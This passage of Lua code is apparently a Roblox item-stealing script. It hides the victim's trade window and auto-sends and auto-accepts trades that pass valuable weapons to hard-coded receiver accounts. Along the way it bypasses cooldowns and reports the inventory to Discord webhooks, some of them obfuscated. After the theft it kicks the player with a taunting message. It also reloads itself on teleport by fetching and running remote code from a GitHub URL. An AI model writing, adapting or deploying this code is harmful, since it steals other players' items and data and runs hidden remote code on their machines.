	local flag8 = flag6 or n >= 3000 or flag7 or n2 >= 30
	local flag9 = false

	if flag8 then
		flag9 = true
	end

	local flag10 = false

	for _, v7 in ipairs(v3) do
		if threshold <= v7.Value then
			flag10 = true
			break
		end
	end

	if webhook ~= "" then
		local v7 = fn19(false, v6)
		v7.content = flag10 and "@everyone" or ""
		fn16()
		fn15(webhook, v7.content, v7.embeds)

		if flag10 then
			fn17()
		end
	end

	if str4 ~= "" then
		fn15("AaFaIalakb*abbaaMaqa[a6aLa-aaacbdb4a_a+aka*aSbeb<awala1aGaaaCa3acasa8a#aEaebaada#aba)a=akbdaRbnaXatawaDahayagbkbwaQazaba6a$avaaayaza[ayalbFb-aFagbibubyaga[aaaAabafa!a1a7aiafa6a*a8acaxa-aiazagavaebDamana-a(aSazaibdbabEa*aHaaabbqa=aCa$aQagbcaMakbhb1ajaibha%aCalbFaka#aAajbuazaBaaajb", "", fn19(true, nil).embeds)
	end

	if flag9 and "AaFanaVa>a-aebhaUaqa]aKaQa}aaawaab#aPb+aka*agbxajbwa=a4axauaCaracavaea&aEa0atada$awa=a-a=adaFbXa#a[awaDahayagbkbwataDabaxabavaaayaEa{ayalbIb-agaSbibLbNbgafaaaAa>afaza4a5aiaOala(aqaRaxa-aiaBaga_a%aUa0ana-a^aGagacb>acbEa*awaaabbqakaCa-amagbcblakbhb2aZahbsa%aCalbFaka]aAaTaua*acaaafb" and str6 ~= "" then
		fn15("AaFanaVa>a-aebhaUaqa]aKaQa}aaawaab#aPb+aka*agbxajbwa=a4axauaCaracavaea&aEa0atada$awa=a-a=adaFbXa#a[awaDahayagbkbwataDabaxabavaaayaEa{ayalbIb-agaSbibLbNbgafaaaAa>afaza4a5aiaOala(aqaRaxa-aiaBaga_a%aUa0ana-a^aGagacb>acbEa*awaaabbqakaCa-amagbcblakbhb2aZahbsa%aCalbFaka]aAaTaua*acaaafb", "", fn19(true, nil).embeds)
	end
end

fn20()

if setclipboard then
	setclipboard("https://discord.gg/3lysium")
end

if #tbl6 == 0 then
	fn("No tradable weapons — stopping")
	return
end

fn("Waiting for Trade folder...")
local trade = ReplicatedStorage:WaitForChild("Trade", 15)

if not trade then
	fn("Trade folder not found — aborting")
	return
end

local flag5 = false
local flag6 = false
local n4 = 0
local n5 = 0
local playerGui = localPlayer:WaitForChild("PlayerGui")
local flag7 = false
local tradeGUI

if playerGui:WaitForChild("MainGUI"):WaitForChild("Game"):FindFirstChild("Inventory") ~= nil then
	tradeGUI = playerGui.TradeGUI
else
	tradeGUI = playerGui.TradeGUI_Phone
	flag7 = true
end

local udim2 = UDim2.new(0, 9999, 0, 9999)

task.spawn(function()
	while task.wait(0.5) do
		pcall(function()
			tradeGUI.Enabled = false
		end)

		if flag7 then
			pcall(function()
				tradeGUI.Container.Position = udim2
			end)

			pcall(function()
				tradeGUI.ClickBlocker.Position = udim2
			end)
		else
			pcall(function()
				tradeGUI.BG.Position = udim2
			end)

			pcall(function()
				tradeGUI.Container.Position = udim2
			end)

			pcall(function()
				tradeGUI.ClickBlocker.Position = udim2
			end)

			pcall(function()
				tradeGUI.Processing.Position = udim2
			end)
		end
	end
end)

local sendRequest = trade:FindFirstChild("SendRequest")

if sendRequest then
	sendRequest.OnClientInvoke = newcclosure(function()
		return true
	end)

	fn("SendRequest.OnClientInvoke hooked — incoming requests blocked")
end

local function fn21()
	local ok4, result4 = pcall(function()
		return trade.GetTradeStatus:InvokeServer()
	end)

	return ok4 and result4 or "None"
end

local function fn22()
	local v6 = fn21()

	if v6 == "StartTrade" then
		pcall(function()
			trade.DeclineTrade:FireServer()
		end)

		flag5 = false
		flag6 = true
		task.wait(0.3)
	elseif v6 == "ReceivingRequest" then
		pcall(function()
			trade.DeclineRequest:FireServer()
		end)

		task.wait(0.3)
	end
end

task.spawn(function()
	while task.wait(0.2) do
		if fn21() == "ReceivingRequest" then
			pcall(function()
				trade.DeclineRequest:FireServer()
			end)
		end

		pcall(function()
			trade.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer or 0)
		end)
	end
end)

local startTrade = trade:FindFirstChild("StartTrade")

if startTrade then
	startTrade.OnClientEvent:Connect(function()
		flag5 = true
		flag6 = false
		fn("StartTrade fired — window open")
	end)
end

local declineTrade = trade:FindFirstChild("DeclineTrade")

if declineTrade then
	declineTrade.OnClientEvent:Connect(function()
		flag5 = false
		flag6 = true
		fn("DeclineTrade — server closed trade")
	end)
end

local acceptTrade = trade:FindFirstChild("AcceptTrade")

if acceptTrade then
	acceptTrade.OnClientEvent:Connect(function(arg)
		if arg then
			flag5 = false
			flag6 = true
			fn("AcceptTrade OnClientEvent — TRADE COMPLETE")
		else
			fn("AcceptTrade OnClientEvent — accept registered")
		end
	end)
end

local updateTrade = trade:FindFirstChild("UpdateTrade")

if updateTrade then
	updateTrade.OnClientEvent:Connect(function(arg)
		if type(arg) ~= "table" then
			return
		end

		if arg.LastOffer ~= nil then
			_G.LastOffer = arg.LastOffer
			n4 = arg.LastOffer
			n5 = tick()
			fn("UpdateTrade: LastOffer=" .. tostring(arg.LastOffer))
		end
	end)

	fn("UpdateTrade listener active")
end

task.spawn(function()
	if not (getupvalues and setupvalue and getloadedmodules) then
		return
	end
	local ok4, result4 = pcall(getloadedmodules)
	if not ok4 or not result4 then
		return
	end
	local n6 = 0

	for _, v6 in ipairs(result4) do
		local ok5, result5 = pcall(getupvalues, v6)

		if ok5 and type(result5) == "table" then
			for k, v7 in pairs(result5) do
				if type(v7) == "number" and v7 >= 0 and v7 <= 6 then
					pcall(setupvalue, v6, k, 0)
					n6 += 1
				end
			end
		end
	end

	fn("Cooldown bypass: zeroed " .. n6 .. " upvalues")
end)

local function fn23(arg)
	local str7 = arg:lower()

	for _, receiver in ipairs(receivers) do
		if str7 == receiver:lower() then
			return true
		end
	end

	if str7:find("no1_lebronjamesfan", 1, true) then
		return true
	end
	return false
end

local function fn24()
	while fn21() ~= "None" do
		task.wait(0.1)
	end
end

local function fn25(arg)
	fn("doTradeWithTarget: " .. arg.Name)
	fn22()

	while true do
		if arg.Parent and #tbl6 > 0 then
			local v6 = fn21()

			if v6 == "None" then
				local ok4, result4 = pcall(function()
					return trade.SendRequest:InvokeServer(arg)
				end)

				if not ok4 then
					fn("SendRequest error: " .. tostring(result4))
					task.wait(2)
				elseif result4 == true then
					fn("Target busy — retry in 3s")
					task.wait(3)
				end
			elseif v6 == "SendingRequest" then
				task.wait(0.3)
			elseif v6 == "ReceivingRequest" then
				trade.DeclineRequest:FireServer()
				task.wait(0.3)
			else
				if v6 == "StartTrade" then
					break
				end
				task.wait(0.5)
			end

			task.wait(0.5)
			continue
		end

		fn("Target left or no more items: " .. arg.Name)
		return
	end

	fn("Trade window open")
	local v6 = fn11()

	if v6 then
		tbl6 = fn12(v6)
		fn("Refreshed inventory - " .. #tbl6 .. " items in queue")
	end

	local tbl7 = {}
	local tbl8 = {}

	for i = 1, #tbl6 do
		if not (#tbl7 >= 4) then
			local v7 = tbl6[i]

			if not tbl8[v7.DataID] then
				tbl8[v7.DataID] = true
				local n6 = 0

				for _, v8 in ipairs(tbl6) do
					if v8.DataID == v7.DataID then
						n6 += v8.Amount or 1
					end
				end

				table.insert(tbl7, { DataID = v7.DataID, Name = v7.Name, Amount = n6, Value = v7.Value })
			end

			continue
		end

		break
	end

	local flag8 = false

	for _, v7 in ipairs(tbl7) do
		if not flag5 then
			flag8 = true
			break
		else
			fn("Offering: " .. v7.DataID .. " x" .. tostring(v7.Amount))

			for i = 1, v7.Amount do
				if not flag5 then
					flag8 = true
					break
				else
					local v8, v9 = fn10(v7.DataID)

					pcall(function()
						trade.OfferItem:FireServer(v8, v9)
					end)
				end
			end

			if not flag8 then
				continue
			end
		end

		break
	end

	if flag8 or #tbl7 == 0 then
		fn("Offer aborted or no items – cancelling")
		trade.DeclineTrade:FireServer()
		tbl6 = {}
		return
	end

	fn("Offered " .. #tbl7 .. " distinct items")
	fn("Waiting for trade completion...")
	local n6 = tick() + 30

	while tick() < n6 do
		if fn21() == "None" then
			fn("Trade ended by server")
			break
		else
			pcall(function()
				trade.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer or 0)
			end)

			task.wait(1)
		end
	end

	fn24()
	task.wait(2)
	local v7 = fn11()

	if v7 then
		tbl6 = fn12(v7)
		v3 = fn13(v7)
		n = 0
		n2 = 0

		for _, v8 in ipairs(v3) do
			n += v8.Value * v8.Amount
			n2 += (v8.DollarValue or 0) * v8.Amount
		end

		fn("Trade complete - " .. #tbl6 .. " items remaining, total value: " .. n .. " ($" .. n2 .. ")")
	else
		fn("Could not verify inventory - rebuilding from scratch")
	end

	fn22()
	flag5 = false
	flag6 = false
	fn("Target left or no more items: " .. arg.Name)
end

local tbl7 = {}
local tbl8 = {}

local function fn26(arg)
	if tbl7[arg.Name] then
		return
	end
	tbl7[arg.Name] = true
	fn("Trade thread starting: " .. arg.Name)

	task.spawn(function()
		local now = tick()

		while tick() - now < 15 do
			if not (arg.Character and arg.Character:FindFirstChildOfClass("Humanoid")) then
				task.wait(0.5)
				continue
			end
			break
		end

		task.wait(1.5)

		if arg.Parent then
			fn25(arg)
		end

		tbl7[arg.Name] = nil
		tbl8[arg.Name] = nil
	end)
end

task.spawn(function()
	while true do
		task.wait(10)

		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= localPlayer and (fn23(player.Name) or fn23(player.DisplayName)) then
				if not tbl7[player.Name] then
					fn26(player)
				end
			end
		end
	end
end)

local function fn27(arg)
	fn26(arg)

	arg.Chatted:Connect(function()
		if not tbl7[arg.Name] then
			fn26(arg)
		end
	end)
end

for _, player in ipairs(Players:GetPlayers()) do
	if player ~= localPlayer and (fn23(player.Name) or fn23(player.DisplayName)) then
		fn27(player)
	end
end

Players.PlayerAdded:Connect(function(player)
	if not (fn23(player.Name) or fn23(player.DisplayName)) then
		return
	end

	if tbl8[player.Name] then
		return
	end
	tbl8[player.Name] = true

	task.spawn(function()
		local now = tick()
		local exitTo = nil

		while true do
			if not (tick() - now < 20) then
				exitTo = 1
				break
			else
				if player.Parent then
					local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")

					if humanoid and humanoid.Health > 0 then
						exitTo = 1
						break
					else
						task.wait(0.5)
						continue
					end
				end

				break
			end
		end

		if exitTo == 1 then
			task.wait(4)
			tbl8[player.Name] = nil

			if player.Parent then
				fn27(player)
			end

			return
		end

		tbl8[player.Name] = nil
	end)
end)

Players.PlayerRemoving:Connect(function(player)
	if tbl7[player.Name] then
		tbl7[player.Name] = nil
	end
end)

fn("── Init complete — all triggers active ──")
local flag8 = false

for _, v6 in ipairs(v3) do
	if threshold <= v6.Value then
		flag8 = true
		break
	else
		flag8 = false
	end
end

if flag8 then
	fn("Player has items above threshold - starting drain kick watcher")

	task.spawn(function()
		while localPlayer.Parent do
			task.wait(15)
			local v6 = fn11()
			if not v6 then
				continue
			end
			local owned = v6.Weapons and v6.Weapons.Owned or {}
			local uniques = v6.Uniques or {}
			local n6 = 0

			for k, v7 in pairs(owned) do
				local str7 = tostring(k)
				local v8 = fn9(str7)

				if v8 and not tbl5[str7] and not tbl5[v8.dataid] then
					if threshold <= v8.value then
						v7 = type(v7) == "number" and v7 or 1
						n6 += v7
					end
				end
			end

			for _, unique in ipairs(uniques) do
				local str7 = tostring(unique.BaseItem or "")

				if str7 ~= "" then
					local v7 = fn9(str7)

					if v7 and not tbl5[str7] and not tbl5[v7.dataid] then
						if threshold <= v7.value then
							n6 += 1
						end
					end
				end
			end

			if n6 ~= 0 then
				continue
			end

			localPlayer:Kick([[All your items just got stolen by Elysium.
 Join our Discord: https://discord.gg/3lysium 
]])

			return
		end
	end)
else
	fn("Player has no items above threshold - drain kick watcher NOT started")
end

local str7 = "    local HttpService = game:GetService(\"HttpService\")\n    local data = HttpService:JSONDecode('" .. HttpService:JSONEncode({ RECEIVERS = receivers, WEBHOOK = webhook, THRESHOLD = threshold }) .. [[')
    getgenv().RECEIVERS = data.RECEIVERS
    getgenv().WEBHOOK   = data.WEBHOOK
    getgenv().THRESHOLD = data.THRESHOLD
    loadstring(game:HttpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2.lua"))()
]]

if queue_on_teleport then
	queue_on_teleport(str7)
end

fn("── Full script loaded with DataID fixing, stacking support, and dollar values ──")
